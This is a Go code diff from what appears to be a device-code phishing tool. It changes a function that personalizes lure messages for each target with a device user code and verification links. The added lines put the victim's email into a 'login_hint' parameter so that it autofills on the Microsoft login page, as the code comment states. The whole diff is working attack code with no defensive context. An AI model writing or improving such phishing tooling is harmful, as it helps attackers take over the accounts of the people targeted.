@@ -500,6 +500,14 @@ func personalizeForTarget(text string, t *DCTarget) string {
 	if landingURL == "" {
 		landingURL = verifyLink
 	}
+	// Append login_hint to the landing URL so the victim's email autofills on the MS login page.
+	if t.Email != "" && !strings.Contains(landingURL, "login_hint") {
+		sep := "?"
+		if strings.Contains(landingURL, "?") {
+			sep = "&"
+		}
+		landingURL += sep + "login_hint=" + url.QueryEscape(t.Email)
+	}
 	text = strings.ReplaceAll(text, "DCCODE",    t.UserCode)
 	text = strings.ReplaceAll(text, "DCLINK",    verifyLink)
 	text = strings.ReplaceAll(text, "DCLANDING", landingURL)
